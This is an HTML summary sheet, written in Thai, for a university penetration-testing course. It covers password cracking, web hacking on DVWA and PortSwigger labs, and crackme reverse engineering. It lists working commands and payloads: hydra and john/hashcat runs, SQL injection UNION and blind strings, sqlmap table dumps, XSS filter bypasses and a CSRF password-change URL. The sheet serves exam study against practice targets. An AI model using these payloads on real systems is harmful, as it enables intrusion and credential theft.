@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A4 สรุป Final 1/2 — L7 Password Cracking · L8 Web Hacking · L9 Reverse Engineering</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="a4.css">
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="index.html" class="brand"><img src="icon.jpg" alt="PenTest Logo" class="brand-logo" />Roadmap</a>
+      <div class="nav-item">
+        <span class="nav-label" tabindex="0">Midterm</span>
+        <div class="nav-drop">
+          <a href="summary1.html">S1 · สรุป A4 L1–L3</a>
+          <a href="summary2.html">S2 · สรุป A4 L4–L6</a>
+          <a href="summary1a.html">S1A · ทฤษฎีสอบข้อเขียน (L1–L6)</a>
+          <a href="summary2a.html">S2A · Command/Lab Steps (L1–L6)</a>
+          <a href="L1.html">L1 · Foundation &amp; Methodology</a>
+          <a href="L2.html">L2 · Reconnaissance &amp; Linux</a>
+          <a href="L3.html">L3 · Scanning (Nmap)</a>
+          <a href="L4.html">L4 · Enumeration</a>
+          <a href="L5.html">L5 · Vulnerability Assessment</a>
+          <a href="L6.html">L6 · Exploitation</a>
+        </div>
+      </div>
+      <div class="nav-item">
+        <span class="nav-label active" tabindex="0">Final</span>
+        <div class="nav-drop">
+          <a href="summary3.html" class="active">S3 · สรุป A4 L7–L9</a>
+          <a href="summary4.html">S4 · สรุป A4 L10–L11</a>
+          <a href="summary3a.html">S3A · Command/Lab Steps (L7–L9)</a>
+          <a href="summary4a.html">S4A · Command/Lab Steps (L10–L11)</a>
+          <a href="L7.html">L7 · Password Cracking</a>
+          <a href="L8.html">L8 · Web Hacking</a>
+          <a href="L9.html">L9 · Reverse Engineering</a>
+          <a href="L10.html">L10 · Penetration Testing Report</a>
+          <a href="L11.html">L11 · Incident Response</a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <main class="sheet">
+
+    <header class="sheet-head">
+      <img src="icon.jpg" alt="logo" class="cs-logo">
+      <h1>PenTest สรุปละเอียดทุก Step — A4 แนวนอน Final 1/2 : L7 Password Cracking · L8 Web Hacking · L9 Reverse Engineering</h1>
+      <div class="pager"><a class="home" href="index.html">Home</a><a href="summary1.html">S1</a><a href="summary2.html">S2</a><a href="summary4.html">S4 →</a></div>
+    </header>
+
+    <div class="cols">
+
+    <!-- ================= L7 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L7 · Password Cracking</span><small>Post-Exploitation — งัด credential ที่ได้มา</small></div>
+      <p><strong>Hash</strong> = One-way function แปลงกลับตรงๆ ไม่ได้ · Linux ใส่ <strong>Salt</strong> กัน hash ซ้ำ · DES (crypt) salt 12-bit · Bcrypt (Blowfish) salt 128-bit → hash 192-bit</p>
+      <table class="tbl">
+        <tr><th>Prefix ใน /etc/shadow</th><th>Hash</th></tr>
+        <tr><td><code>$1$</code></td><td>MD5 (md5crypt)</td></tr>
+        <tr><td><code>$2a$</code></td><td>Blowfish / Bcrypt</td></tr>
+        <tr><td><code>$5$</code> · <code>$6$</code></td><td>SHA-256 · SHA-512</td></tr>
+        <tr><td><code>$y$</code> · <code>$7$</code> · ไม่มี prefix</td><td>yescrypt · DES</td></tr>
+      </table>
+      <div class="sub">ประเภทการโจมตี</div>
+      <ul>
+        <li><b>Passive Online:</b> ดักฟัง traffic — Wire Sniffing, MitM, Replay</li>
+        <li><b>Active Online:</b> เดารหัสกับเป้าหมายตรงๆ (Brute-force/Guessing) — เสียงดัง ตรวจจับง่าย</li>
+        <li><b>Offline:</b> นำ hash มาแคร็กบนเครื่องตัวเอง — เร็ว เงียบ (Brute Force / Dictionary / Rainbow Table)</li>
+        <li><b>Non-electronic:</b> Social Engineering</li>
+      </ul>
+      <div class="sub">Wordlist &amp; Tools</div>
+      <p><code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code> · สร้างเอง: <code>crunch 4 4 abcdefghijklmnopqrstuvwxyz -o w.txt</code> · <code>crunch 8 8 ... -t %%%%%%-%%%%%%</code></p>
+      <p><b>Hydra</b> = Online brute (FTP/SSH) · <b>John</b> = Offline (หลายแฮช) · <b>Hashcat</b> = Offline command-line (เร็ว, GPU) · <b>Aircrack-ng</b> = WiFi WEP/WPA</p>
+      <div class="sub">คำสั่งหลัก (จำไปสอบ)</div>
+      <ol>
+        <li><code>hydra -L users.txt -P passwords.txt &lt;Target_IP&gt; ftp</code> → ยืนยันด้วย <code>ftp &lt;IP&gt;</code></li>
+        <li><code>unshadow passwd shadow &gt; hashes.txt</code> รวมไฟล์ก่อนแคร็ก + <code>rm ~/.john/john.pot</code> ล้างผลเก่า</li>
+        <li><code>john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt meta_shadow</code></li>
+        <li><code>john --show meta_shadow</code> ดูรหัสที่ถอดได้</li>
+        <li><code>hashcat -m 500 -a 0 meta_shadow_cut rockyou.txt --potfile-disable</code> (-m 500=MD5-crypt, -a 0=Dictionary)</li>
+        <li><code>aircrack-ng -w rockyou.txt -b &lt;BSSID&gt; wpachallenge*.cap</code> (WPA) · WEP ใช้ <code>-b</code> เดี่ยว</li>
+      </ol>
+      <p class="step">💡 <b>เกร็ด:</b> WEP เจาะได้เพราะ IV สั้น+คีย์คงที่ → IV ซ้ำ · ก่อนใช้ hashcat/john ต้องรู้ชนิดแฮช (ดู prefix) ไม่งั้น -m ผิด = ไม่เจอ · Assignment: แคร็ก shadow 5 รายการ (DES/MD5/SHA-256/SHA-512) แนบภาพ <code>john --show</code></p>
+    </section>
+
+    <!-- ================= L8 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L8 · Web Hacking (1) — DVWA &amp; SQL Injection</span><small>PTES: Vuln Analysis + Exploitation (Web)</small></div>
+      <p><strong>DVWA</strong> = เว็บ PHP/MySQL ที่จงใจมีช่องโหว่สำหรับฝึกอย่างถูกกฎหมาย · ติดตั้ง <code>sudo apt install dvwa</code> → <code>dvwa-start</code> · login <code>admin/password</code> · ปุ่ม View Source (ดู PHP) + View Help</p>
+      <table class="tbl">
+        <tr><th>Level</th><th>ความหมาย</th></tr>
+        <tr><td>Low</td><td>ไม่มีมาตรการป้องกันเลย (Docker default)</td></tr>
+        <tr><td>Medium</td><td>dev พยายามป้องกันแต่ยังผิดพลาด (bad practice)</td></tr>
+        <tr><td>High</td><td>ป้องกันยากขึ้น/ทางเลือกแย่ — เหมือน CTF</td></tr>
+        <tr><td>Impossible</td><td>ปลอดภัยจริง (Kali default) — ใช้เทียบวิธีป้องกันที่ถูก</td></tr>
+      </table>
+      <div class="sub">SQL Injection — หลักการ</div>
+      <p>แทรกคำสั่ง SQL เข้า query ของแอป → ดู/แก้/ลบ data ที่ไม่มีสิทธิ์ · Escape chars: <code>' " ` ) ')</code> แล้วปิดด้วย comment</p>
+      <table class="tbl">
+        <tr><th>DBMS</th><th>Comment</th></tr>
+        <tr><td>MySQL</td><td><code>#</code> · <code>-- </code> (มี space) · <code>/* */</code></td></tr>
+        <tr><td>PostgreSQL / MSSQL / SQLite</td><td><code>--</code> · <code>/* */</code></td></tr>
+        <tr><td>Oracle</td><td><code>--</code></td></tr>
+      </table>
+      <p><b>พิสูจน์ว่ามีช่องโหว่:</b> <code>Peter' or '1'='1</code> ให้ผลเหมือน <code>Peter</code> · หรือคณิตศาสตร์ <code>?id=2-1</code> = <code>?id=1</code> → ได้ทุกแถว (tautology)</p>
+      <p><b>DVWA Low:</b> <code>%' or '0'='0</code> → <code>SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';</code> · <code>' or 1=1#</code></p>
+      <div class="sub">UNION-based Injection</div>
+      <p>UNION รวมผล 2 query — <b>ต้องได้จำนวนคอลัมน์เท่ากัน</b> · นับคอลัมน์: ไล่ <code>ORDER BY X#</code> จน error หรือเติม null: <code>1' UNION SELECT null,null --</code></p>
+      <ol>
+        <li><code>%' UNION SELECT table_name,column_name FROM information_schema.columns #</code> — ดู schema ทั้งหมด</li>
+        <li><code>' union select table_name,null from information_schema.tables#</code> — รายชื่อตาราง</li>
+        <li><code>%' UNION SELECT user, password FROM users #</code> — ได้ MD5 hash: <code>admin:5f4dcc3b...</code> → เอาไปแคร็กต่อ (L7)</li>
+      </ol>
+      <div class="sub">Error-based &amp; Blind</div>
+      <ul>
+        <li><b>Error-based:</b> ไม่เห็น output แต่เห็น error → บังคับ error ที่ฝัง data (row()/count()/concat + floor(rand()*2)) ให้ข้อมูลโผล่ในข้อความ error</li>
+        <li><b>Boolean blind:</b> <code>2' AND 1=1#</code> (จริง) vs <code>2' AND 1=0#</code> (เท็จ) — page เปลี่ยนตาม</li>
+        <li><b>Timing blind:</b> <code>2' AND SLEEP(5)#</code> — หน้าค้าง 5 วิ = คำสั่งรันจริง</li>
+        <li><b>หาคอลัมน์:</b> <code>2' ORDER BY X#</code> จน behavior เปลี่ยน (X=3 error → มี 2 คอลัมน์) · <b>หาความยาว DB:</b> <code>2' AND LENGTH(DATABASE())=X#</code></li>
+      </ul>
+      <div class="sub">sqlmap — Automate</div>
+      <p>รองรับ 6 เทคนิค (boolean/time blind, error, UNION, stacked, out-of-band) · enumerate users/hashes/privileges/DBs/tables/columns · เอา <b>PHPSESSID</b> จาก DevTools F12 → Application/Storage → Cookies</p>
+      <p><code>sqlmap -u "http://&lt;IP&gt;/dvwa/...?id=1&amp;Submit=Submit#" --cookie="security=medium;PHPSESSID=&lt;id&gt;"</code> · POST เพิ่ม <code>--data="id=1&amp;Submit=Submit" -p id</code> · <code>--dbs</code> → <code>-D dvwa --tables</code> → <code>-D dvwa -T users --columns</code> → <code>-D dvwa -T users --dump</code></p>
+      <p class="step">💡 <b>เกร็ด:</b> ผล sqlmap เก็บที่ <code>~/.local/share/sqlmap/output/&lt;IP&gt;</code> เปิด <code>session.sqlite</code> ด้วย <code>sqlitebrowser</code> · ค่า security= ใน cookie ต้องตรงกับ DVWA level</p>
+    </section>
+
+    <!-- ================= L8 (2) ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L8 · Web Hacking (2) — CSRF · XSS · Burp Suite</span><small>โจมตีฝั่ง client + เครื่องมือ intercept</small></div>
+      <div class="sub">CSRF (Cross-Site Request Forgery)</div>
+      <p>บังคับเบราว์เซอร์เหยื่อยิง request แทนเจ้าตัว (ใช้ session ที่ล็อกอินค้าง) · เงื่อนไข: (1) มี valuable action ให้โจมตี (2) session ผ่าน cookie/Basic Auth (3) ไม่มี unpredictability parameter (token)</p>
+      <p><b>DVWA Low:</b> <code>http://&lt;IP&gt;/dvwa/vulnerabilities/csrf/?password_new=kmutnb&amp;password_conf=kmutnb&amp;Change=Change#</code> — GET + ไม่มี token → ล่อให้คลิก = เปลี่ยนรหัสผ่านเหยื่อทันที</p>
+      <div class="sub">XSS (Cross-Site Scripting) — 3 ประเภท</div>
+      <table class="tbl">
+        <tr><th>Type</th><th>กลไก</th></tr>
+        <tr><td>Reflected</td><td>script จาก request ปัจจุบัน สะท้อนกลับทันที — ไม่เก็บ (victim ต้องกดลิงก์)</td></tr>
+        <tr><td>Stored</td><td>script ถูกเก็บใน DB → รันกับทุกคนที่เปิดหน้า (อันตรายสุด)</td></tr>
+        <tr><td>DOM-based</td><td>ช่องโหว่ใน client-side JS — response ไม่เปลี่ยน (document.URL/location/referrer)</td></tr>
+      </table>
+      <table class="tbl">
+        <tr><th>Payload ตาม Level (DVWA)</th><th>Low</th><th>Medium (bypass)</th><th>High (bypass)</th></tr>
+        <tr><td>Reflected</td><td><code>&lt;script&gt;alert("xss")&lt;/script&gt;</code></td><td><code>&lt;Script&gt;alert()&lt;/Script&gt;</code> สลับตัวพิมพ์</td><td><code>&lt;img src=x onerror=alert()&gt;</code> ใช้ event</td></tr>
+        <tr><td>Stored</td><td><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></td><td><code>&lt;img src=x onerror=...&gt;</code></td><td><code>&lt;body onload=alert("bingo")&gt;</code></td></tr>
+        <tr><td>DOM</td><td><code>?default=&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td><code>?default=English#&lt;script&gt;...&lt;/script&gt;</code>+reload</td><td><code>#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>+reload</td></tr>
+      </table>
+      <div class="sub">Burp Suite</div>
+      <p>ติดตั้ง: <code>chmod +x burpsuite_community_*.sh</code> → <code>./burpsuite_community_*.sh</code> หรือ <code>sudo apt install burpsuite -y</code> (มี Burp's browser) · Firefox + FoxyProxy สลับ proxy · ติดตั้ง CA cert: เปิด <code>http://burp</code> → CA Certificate → Import <code>cacert.der</code> (จำเป็นสำหรับ HTTPS)</p>
+      <p><b>Workflow:</b> Intercept on → ทำ action → ดัก request → คลิกขวา Send to Repeater → แก้ค่า → Send → Refresh หน้าเว็บดูผล</p>
+      <p><b>Lab price manipulation:</b> login wiener/peter · jacket $1337 แต่มี $100 → intercept add-to-cart เห็น <code>price=133700</code> → Repeater แก้เป็น 1300 → refresh → ราคา $13.00 → place order ✓ (Business Logic Flaw — server เชื่อราคาจาก client)</p>
+      <div class="sub">PortSwigger Academy Labs</div>
+      <table class="tbl">
+        <tr><th>Lab</th><th>Payload / Solution</th></tr>
+        <tr><td>SQLi hidden data</td><td><code>category='+OR+1=1--</code></td></tr>
+        <tr><td>SQLi login bypass</td><td><code>username=administrator'--</code></td></tr>
+        <tr><td>DB version (Oracle)</td><td><code>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code> (test ด้วย <code>...FROM+dual--</code>)</td></tr>
+        <tr><td>DB version (MySQL/MSSQL)</td><td><code>'+UNION+SELECT+@@version,+NULL#</code></td></tr>
+        <tr><td>XSS reflected/stored/DOM</td><td><code>&lt;script&gt;alert("My Script!")&lt;/script&gt;</code> · DOM: <code>"&gt;&lt;svg onload=alert(1)&gt;</code></td></tr>
+        <tr><td>CSRF email change</td><td>exploit HTML: form POST hidden email + <code>document.forms[0].submit();</code> → exploit server → Store → Deliver to victim</td></tr>
+      </table>
+      <p class="step">💡 <b>Exercise:</b> XSS reflected พิมพ์ <code>&lt;script&gt;alert("This is my XSS script running!")&lt;/script&gt;</code> ในช่อง textbox · XSS stored ใส่ script ใน guestbook (เก็บลง DB) แล้วเปิดหน้าแรกดู alert · CSRF ตั้งรหัสใหม่ "123" แล้วสังเกต URL ที่ไม่มี token</p>
+    </section>
+
+    <!-- ================= L9 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L9 · Reverse Engineering</span><small>Cloud Lab (TryHackMe) — ถอด binary หาคำตอบ</small></div>
+      <p><strong>RE</strong> = ถอดประกอบ+วิเคราะห์ซอฟต์แวร์เพื่อเข้าใจการทำงานภายใน · Goals: เข้าใจระบบ → หาช่องโหว่ → พัฒนา exploit → เข้าถึงโดยไม่ได้รับอนุญาต (ใน lab) · Role: หาช่องโหว่ซ่อนเร้น · สร้างวิธีป้องกันเฉพาะระบบ · เสริมเกราะเชิงรุก</p>
+      <div class="sub">เทคนิค &amp; ความท้าทาย</div>
+      <p><b>Disassembly</b> (แตกเป็น assembly) · <b>Decompilation</b> (แปลงกลับภาษา level สูง) · <b>Static</b> (ไม่รัน) · <b>Dynamic</b> (รัน+เฝ้าดู) · <b>Fuzzing</b> (ยิง input แปลก) — ท้าทาย: Complexity · Obfuscation · Legal · จริยธรรม: ต้องมี authorization · เคารพ IP · ใช้อย่างมีความรับผิดชอบ · เคารพ privacy</p>
+      <div class="sub">เครื่องมือ</div>
+      <table class="tbl">
+        <tr><th>กลุ่ม</th><th>Tools</th></tr>
+        <tr><td>Disassembler/Decompiler</td><td>IDA Pro · Ghidra (NSA, ฟรี) · OllyDbg (Win) · Jad (Java)</td></tr>
+        <tr><td>Static</td><td>BinDiff · Radare2 · Cuckoo Sandbox</td></tr>
+        <tr><td>Dynamic</td><td>Wireshark · Process Monitor · Regmon</td></tr>
+        <tr><td>อื่นๆ</td><td>Hex editors (HxD) · Debuggers · Python/Perl scripting</td></tr>
+      </table>
+      <div class="sub">คำสั่งบน Kali</div>
+      <table class="tbl">
+        <tr><th>คำสั่ง</th><th>ได้อะไร</th></tr>
+        <tr><td><code>file f</code></td><td>ชนิดไฟล์ (ขั้นแรกเสมอ)</td></tr>
+        <tr><td><code>strings f</code></td><td>ข้อความที่อ่านได้ใน binary (หา flag/hint)</td></tr>
+        <tr><td><code>hexdump -C f</code> / <code>xxd</code></td><td>hex ดิบของไฟล์</td></tr>
+        <tr><td><code>ltrace ./f</code></td><td>library calls (เช่น strcmp ที่เทียบรหัส)</td></tr>
+        <tr><td><code>strace ./f</code></td><td>system calls (open/read/socket)</td></tr>
+        <tr><td><code>gdb ./f</code></td><td>debug ทีละบรรทัด + breakpoint</td></tr>
+        <tr><td><code>objdump -d ./f</code></td><td>disassembly (assembly code)</td></tr>
+      </table>
+      <p><b>Workflow:</b> <code>file</code> → <code>strings f | less</code> → <code>strace/ltrace</code> → <code>objdump -d f | less</code> · ELF = ฟอร์แมต executable มาตรฐานของ Unix/Linux</p>
+      <div class="sub">Assembly Analysis — หารหัสผ่าน</div>
+      <ol>
+        <li>หา main function (จุดรับ input + ตรวจ credential)</li>
+        <li>หา input function: <code>scanf</code> / <code>fgets</code> / <code>gets</code></li>
+        <li>หาจุดตัดสินใจ: <code>cmp</code>/<code>test</code> + <code>je</code> (เท่ากัน=ถูก) / <code>jne</code> (ไม่เท่า=ผิด)</li>
+        <li>อ่าน hardcoded credential: ค่าหลัง cmp หรือใน register ก่อนเทียบ</li>
+      </ol>
+      <p><b>ตัวอย่าง crackme6:</b> <code>cmp $0x31,%al</code> <code>cmp $0x33</code> <code>cmp $0x37</code>… → hex <code>313333375f707764</code> → <code>echo "313333375f707764" | xxd -r -p</code> → <b>1337_pwd</b></p>
+      <div class="sub">Lab: TryHackMe Reversefiles (crackme1–8)</div>
+      <table class="tbl">
+        <tr><th>Task</th><th>วิธี</th></tr>
+        <tr><td>1 crackme1</td><td><code>chmod +x crackme1</code> → <code>./crackme1</code></td></tr>
+        <tr><td>2 crackme2</td><td><code>strings crackme2</code></td></tr>
+        <tr><td>3 crackme3</td><td><code>strings</code> → เจอ Base64 → <code>echo "ZjByX3kwdXJf..." | base64 -d</code> (หรือ CyberChef)</td></tr>
+        <tr><td>4 crackme4</td><td><code>ltrace ./crackme4</code> (ดู <code>strcmp</code>)</td></tr>
+        <tr><td>5 crackme5</td><td><code>ltrace ./crackme5</code></td></tr>
+        <tr><td>6 crackme6</td><td><code>strace</code> + <code>objdump -d</code> → xxd แปลง hex</td></tr>
+        <tr><td>7 crackme7</td><td><code>ghidra</code> → <code>python3 -c 'print(int("7a69", 16))'</code> = <b>31337</b></td></tr>
+        <tr><td>8 crackme8</td><td>Ghidra / assembly analysis (โจทย์ยาก)</td></tr>
+      </table>
+      <p><b>Lab malware (strings1):</b> <code>7z x strings1.zip -pMalwareTech</code> → <code>strings strings1.exe_</code> · Ghidra: New Project (Non-Shared) → Import File → ดู address <code>00432294</code> → Challenge 3: <code>LoadStringA(0x0,0x110,&amp;local_4a4,0x3ff)</code></p>
+      <p class="step">💡 <b>เกร็ด:</b> ลำดับความยากของโจทย์ = ลำดับเครื่องมือ: รันตรงๆ → strings → decode → ltrace → strace → objdump → Ghidra · อ่าน hex ASCII: <code>0x31</code>='1', <code>0x5f</code>='_', <code>0x64</code>='d'</p>
+    </section>
+
+    </div>
+
+    <div class="sheet-foot">
+      <span>Penetration Testing &amp; Protection (0406136051) — แผ่นสรุป A4 แนวนอน · Final</span>
+      <span>หน้า Final 1/2 · L7–L9 · ต่อ Final 2/2: S4 (L10–L11)</span>
+    </div>
+
+  </main>
+</body>
+</html>
